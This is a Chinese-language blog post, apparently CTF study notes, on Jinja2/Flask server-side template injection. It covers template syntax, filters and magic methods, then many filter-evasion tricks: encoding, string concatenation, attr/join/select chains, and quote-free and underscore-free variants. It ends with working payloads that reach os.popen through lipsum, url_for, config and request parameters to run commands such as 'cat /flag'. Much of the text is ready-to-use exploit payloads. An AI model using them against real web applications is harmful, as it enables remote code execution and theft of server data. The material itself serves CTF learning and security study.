      </tags>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2025/03/06/SSTI/</url>
    <content><![CDATA[<p>ssti服务器端模板注入介绍<a href="https://xz.aliyun.com/news/3311?time__1311=eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken=71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig=1a0c399d17412599679115146e00dd">https://xz.aliyun.com/news/3311?time__1311=eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken=71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig=1a0c399d17412599679115146e00dd</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/110220425?ops_request_misc=%257B%2522request%255Fid%2522%253A%25222cb62d33ba893b3db6b482f839a01105%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=2cb62d33ba893b3db6b482f839a01105&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-110220425-null-null.nonecase&amp;utm_term=ssti&amp;spm=1018.2226.3001.4450">yu22x博客之ssti模板注入绕过进阶</a></p>
<h1>语法</h1>
<p>官方文档对于模板的语法介绍如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% ... %&#125; for Statements </span><br><span class="line"></span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output</span><br><span class="line"></span><br><span class="line">&#123;# ... #&#125; for Comments not included in the template output</span><br><span class="line"></span><br><span class="line">#  ... # for Line Statements</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。</span><br><span class="line">&#123;&#123;&#125;&#125;用于将表达式打印到模板输出</span><br><span class="line">&#123;##&#125;表示未包含在模板输出中的注释</span><br><span class="line">##可以有和&#123;%%&#125;相同的效果</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set x= &#x27;abcd&#x27; %&#125;  声明变量</span><br><span class="line">&#123;% for i in [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125; 循环语句</span><br><span class="line">&#123;% if 25==5*5 %&#125;&#123;&#123;1&#125;&#125;&#123;% endif %&#125;  条件语句</span><br><span class="line"></span><br><span class="line">&#123;% for i in [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;] %&#125;	开始一个 for 循环，遍历列表 [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]，每次循环将当前元素赋值给变量 i</span><br><span class="line">&#123;&#123; i &#125;&#125;	输出变量 i 的值（当前的循环元素）</span><br><span class="line">&#123;% endfor %&#125;	结束循环</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># for i in [&#x27;a&#x27;,&#x27;1&#x27;]</span><br><span class="line">&#123;&#123; i &#125;&#125;</span><br><span class="line"># endfor</span><br><span class="line"></span><br><span class="line">&#123;% for i in [&#x27;a&#x27;,&#x27;1&#x27;] %&#125;</span><br><span class="line">&#123;&#123; i &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">这两条是等效的，但是有个前提，必须在environment中配置line_statement_prefix</span><br><span class="line">即</span><br><span class="line">app.jinja_env.line_statement_prefix=&quot;#&quot;</span><br></pre></td></tr></table></figure>
<h2 id="变量">变量</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]). </span><br></pre></td></tr></table></figure>
<p>也就是说<br>
除了标准的python语法使用点（.）外，还可以使用中括号（[]）来访问变量的属性。<br>
比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[&#x27;__classs__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>所以过滤了点，我们还可以用中括号绕过。</strong></p>
<p>如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code><br>
<strong>所以对于取字典中键值的情况不仅可以用<code>[]</code>，也可以用<code>__getitem__</code></strong><br>
当然对于字典来说，我们也可以用他自带的一些方法了。pop就是其中的一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop(key[,default])</span><br><span class="line">参数</span><br><span class="line">key: 要删除的键值</span><br><span class="line">default: 如果没有 key，返回 default 值</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br></pre></td></tr></table></figure>
<p><strong>我们要使用字典中的键值的话，也可以用<code>list.pop(&quot;var&quot;)</code></strong>,但大家最好不要用这个，除非万不得已，因为会删除里面的键，如果删除的是一些程序运行需要用到的，就可能使得服务器崩溃。然后过了一遍字典的方法，发现<strong>get</strong>和<strong>setdefault</strong>是个不错的选择</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dict.get(key, default=None)</span><br><span class="line">返回指定键的值，如果值不在字典中返回default值</span><br><span class="line"></span><br><span class="line">dict.setdefault(key, default=None)</span><br><span class="line">和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default]()</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__getitem__(&#x27;__builtins__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.pop(&#x27;__builtins__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.get(&#x27;__builtins__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.setdefault(&#x27;__builtins__&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>那么调用对象的方法具体是什么原理呢，其实他是调用了魔术方法<code>__getattribute__</code><br>
即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__</span><br><span class="line"><span class="string">&quot;&quot;</span>.<span class="title function_ invoke__">__getattribute__</span>(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>如果题目过滤了class或者一些关键字，我们是不是就可以通过字符串处理进行拼接了。</strong><br>
对于我们来说，能转换成字符串会更好处理一些。<br>
那我们就顺势讲一下字符串的一些处理方法。</p>
<h1>字符串过滤</h1>
<h2 id="1、拼接"><strong>1、拼接</strong></h2>
<p><code>&quot;cla&quot;+&quot;ss&quot;</code></p>
<h2 id="2、反转"><strong>2、反转</strong></h2>
<p><code>&quot;__ssalc__&quot;[::-1]</code></p>
<p>但是实际上我发现其实加号是多余的，在jinjia2里面，<code>&quot;cla&quot;&quot;ss&quot;</code>是等同于<code>&quot;class&quot;</code>的，也就是说我们可以这样引用class，并且绕过字符串过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</span><br><span class="line">&quot;&quot;[&quot;__ssalc__&quot;][::-1]</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</span><br></pre></td></tr></table></figure>
<h2 id="3、ascii转换">3、ascii转换</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:c&#125;&quot;</span>.format(<span class="number">97</span>)=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.format(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)=<span class="string">&#x27;__class__&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="4、编码绕过">4、编码绕过</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span><br><span class="line">对于python2的话，还可以利用base64进行绕过</span><br><span class="line">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="5、利用chr函数">5、利用chr函数</h2>
<p>因为我们没法直接使用chr函数，所以需要通过__builtins__找到他</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="6、在jinja2里面可以利用-进行拼接">6、在jinja2里面可以利用~进行拼接</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="7、大小写转换">7、大小写转换</h2>
<p>前提是过滤的只是小写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;[&quot;__CLASS__&quot;.lower()]</span><br></pre></td></tr></table></figure>
<p>先想到这些，下面讲过滤器再补充</p>
<h1>过滤器</h1>
<p>原文介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may </span><br><span class="line">have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is </span><br><span class="line">applied to the next.</span><br><span class="line">For example, &#123;&#123; name|striptags|title &#125;&#125; will remove all HTML Tags from variable name and title-case the</span><br><span class="line">output (title(striptags(name))).</span><br><span class="line"></span><br><span class="line">变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多</span><br><span class="line">个过滤器。一个过滤器的输出应用于下一个过滤器。</span><br><span class="line"></span><br><span class="line">例如，&#123;&#123; name|striptags|title &#125;&#125; 将删除变量名中的所有HTML标记，并将title大小写为输出(title(striptags(name)))。</span><br></pre></td></tr></table></figure>
<p>讲几个对我们进行模板注入比较实用的吧，其他的大家可以去文档中学习。</p>
<h2 id="attr"><strong>attr</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get an attribute of an object. foo|attr(&quot;bar&quot;) works like foo.bar just that always an attribute is returned and </span><br><span class="line">items are not looked up.</span><br></pre></td></tr></table></figure>
<p>也就是说 attr用于获取变量<br>
例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure>
<p>常见于点号<code>(.)</code>被过滤，或者点号<code>(.)</code>和中括号<code>([])</code>都被过滤的情况。</p>
<h2 id="format"><strong>format</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apply the given values to a printf-style format string, like string % values.</span><br></pre></td></tr></table></figure>
<p>功能和我们前面讲到的字符串绕过中的format类似。<br>
用法<br>
{ “%s, %s!”|format(greeting, name) }}<br>
那么我们想要调用__class__就可以用format了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#x27;.format(&#x27;_&#x27;, &#x27;_&#x27;, &#x27;class&#x27;, &#x27;_&#x27;, &#x27;_&#x27;)</span><br><span class="line">等同于&#x27;__class__&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#x27;__class__&#x27;</span><br><span class="line">&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]</span><br></pre></td></tr></table></figure>
<h2 id="first-last-random"><strong>first last random</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Return the first item of a sequence.</span><br><span class="line">Return the last item of a sequence.</span><br><span class="line">Return a random item from the sequence.</span><br></pre></td></tr></table></figure>
<p>前两个其实用处不是很大，因为他只能返回第一个值或者最后一个，当然，如果我们用的就是第一个或者最后一个那就ok了。<br>
random的话是随机返回，这样我们跑个脚本肯定是可以得到我们想要的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__|last()</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1]</span><br></pre></td></tr></table></figure>
<h2 id="join"><strong>join</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Return a string which is the concatenation of the strings in the sequence. The separator between elements is an</span><br><span class="line">empty string per default, you can define it with the optional parameter:</span><br><span class="line"></span><br><span class="line">&#123;&#123; [1, 2, 3]|join(&#x27;|&#x27;) &#125;&#125;</span><br><span class="line">    -&gt; 1|2|3</span><br><span class="line"></span><br><span class="line">&#123;&#123; [1, 2, 3]|join &#125;&#125;</span><br><span class="line">    -&gt; 123</span><br><span class="line">It is also possible to join certain attributes of an object:</span><br><span class="line"></span><br><span class="line">&#123;&#123; users|join(&#x27;, &#x27;, attribute=&#x27;username&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这个用处就相当大了，我们貌似又多了一种字符串拼接的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;[[&#x27;__clas&#x27;,&#x27;s__&#x27;]|join] 或者 &quot;&quot;[(&#x27;__clas&#x27;,&#x27;s__&#x27;)|join]</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure>
<h2 id="lower"><strong>lower</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Convert a value to lowercase.</span><br><span class="line">功能类似于前面的转换成小写</span><br><span class="line"></span><br><span class="line">&quot;&quot;[&quot;__CLASS__&quot;|lower]</span><br></pre></td></tr></table></figure>
<h2 id="replace-reverse"><strong>replace reverse</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Return a copy of the value with all occurrences of a substring replaced with a new one. The first </span><br><span class="line">argument is the substring that should be replaced, the second is the replacement string. If the optional </span><br><span class="line">third argument count is given, only the first count occurrences are replaced</span><br><span class="line"></span><br><span class="line">Reverse the object or return an iterator that iterates over it the other way round.</span><br></pre></td></tr></table></figure>
<p>我们可以利用替换和反转还原回我们要用的字符串了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;</span><br><span class="line">&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</span><br></pre></td></tr></table></figure>
<h2 id="string"><strong>string</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Make a string unicode if it isn’t already. That way a markup string is not converted back to unicode.</span><br></pre></td></tr></table></figure>
<p>功能类似于python内置函数 str<br>
有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__   出来的是&lt;class &#x27;tuple&#x27;&gt;</span><br><span class="line">(().__class__|string)[0] 出来的是&lt;</span><br><span class="line">(().__class__ | string)[1:6] 出来的是class</span><br></pre></td></tr></table></figure>
<h2 id="select-unique">select unique</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.</span><br><span class="line">If no test is specified, each object will be evaluated as a boolean.</span><br><span class="line">通过对每个对象应用测试并仅选择测试成功的对象来筛选对象序列。</span><br><span class="line">如果没有指定测试，则每个对象都将被计算为布尔值</span><br><span class="line"></span><br><span class="line">Returns a list of unique items from the given iterable.</span><br></pre></td></tr></table></figure>
<p>这两个乍一看感觉没啥用处，其实如果我们和上面的结合就会发现他们巨大的用处</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">()|select|string</span><br><span class="line">结果如下</span><br><span class="line">&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;</span><br></pre></td></tr></table></figure>
<p>这样我们会拥有比前面更多的字符来用于拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[15]~</span><br><span class="line">(()|select|string)[20]~</span><br><span class="line">(()|select|string)[6]~</span><br><span class="line">(()|select|string)[18]~</span><br><span class="line">(()|select|string)[18]~</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[24]</span><br><span class="line"></span><br><span class="line">得到字符串&quot;__class__&quot;</span><br></pre></td></tr></table></figure>
<h2 id="list"><strong>list</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Convert the value into a list. If it was a string the returned list will be a list of characters.</span><br></pre></td></tr></table></figure>
<p>转换成列表<br>
更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>
只是单纯的字符串的话取单个字符方法有限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(()|select|string)[0]</span><br><span class="line">如果中括号被过滤了，挺难的</span><br><span class="line">但是列表的话就可以用pop取下标了</span><br><span class="line">当然都可以使用__getitem__</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(()|select|string|list).pop(0)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p>过滤器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">int()：将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()：字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)：截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()：将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()：返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()：返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>各种魔法方法</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__getitem__</span><br><span class="line">obj[key]  ≡  obj.__getitem__(key)</span><br></pre></td></tr></table></figure>
<h1>模板1</h1>
<p>ssti模板注入的起点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lipsum、cycler、joiner、namespace和()、&#x27;&#x27;、&quot;&quot;等</span><br><span class="line">&#123;&#123; lipsum.__globals__.os.popen(&#x27;id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; cycler.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; joiner.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; namespace.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; ().__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>起点对象</th>
<th>类型</th>
<th>利用路径</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>lipsum</code></td>
<td>函数</td>
<td><code>.__globals__['os']</code></td>
</tr>
<tr>
<td><code>cycler</code></td>
<td>类</td>
<td><code>.__init__.__globals__['os']</code></td>
</tr>
<tr>
<td><code>joiner</code></td>
<td>函数</td>
<td><code>.__globals__['os']</code></td>
</tr>
<tr>
<td><code>namespace</code></td>
<td>函数</td>
<td><code>.__globals__['os']</code></td>
</tr>
<tr>
<td><code>().__class__</code></td>
<td>对象</td>
<td><code>.__mro__[1].__subclasses__()</code> 链式绕</td>
</tr>
<tr>
<td><code>url_for</code></td>
<td>函数</td>
<td><code>.__globals__['os']</code></td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">初版</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">x——builtins版</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">lipsum版</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(request.args.ocean).read()&#125;&#125;&amp;ocean=cat /flag</span><br><span class="line"></span><br><span class="line">get参数版——直接globals</span><br><span class="line">&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br><span class="line">get传参版——lipsum</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(request.args.ocean).read()&#125;&#125;&amp;ocean =cat /flag</span><br><span class="line">get传参无args版(atgs换成values)</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(request.values.ocean).read()&#125;&#125;&amp;ocean=cat /flag</span><br><span class="line">get传参无args版(atgs换成Cookie)（参数写在cookie当中用分号隔开）</span><br><span class="line">&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;</span><br><span class="line">a=os;b=popen;c=cat /flag</span><br><span class="line"></span><br><span class="line">config拼接版</span><br><span class="line">&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;</span><br><span class="line">等于：&#123;&#123;url_for.__globals__[&#x27;os&#x27;]&#125;&#125;</span><br><span class="line">%2B是+</span><br><span class="line"></span><br><span class="line">无引号、无下划线</span><br><span class="line">&#123;&#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()&#125;&#125;&amp;ocean=cat /flag&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;f=read</span><br><span class="line">相当于：lipsum.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()&#125;&#125;&amp;ocean=cat /flag&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;f=read</span><br><span class="line">相当于：lipsum.__globals__.__getiem__(&#x27;os&#x27;).[&#x27;popen&#x27;](&#x27;/cat /flag&#x27;).read()</span><br><span class="line">如果过滤了&#123;&#123;&#125;&#125;，直接换成&#123;%print()%&#125;:</span><br><span class="line">&#123;%print(lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)())%&#125;&amp;ocean=cat /flag&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;f=read</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">综上模板request可以通杀，因为我们可以通过request来传参，而参数独立与&#123;&#123;&#125;&#125;之外</span><br></pre></td></tr></table></figure>
<h1>模板2</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤单双引号、args、中括号[]、下划线、os、&#123;&#123;、request</span><br></pre></td></tr></table></figure>
<p>关键是过滤了request</p>
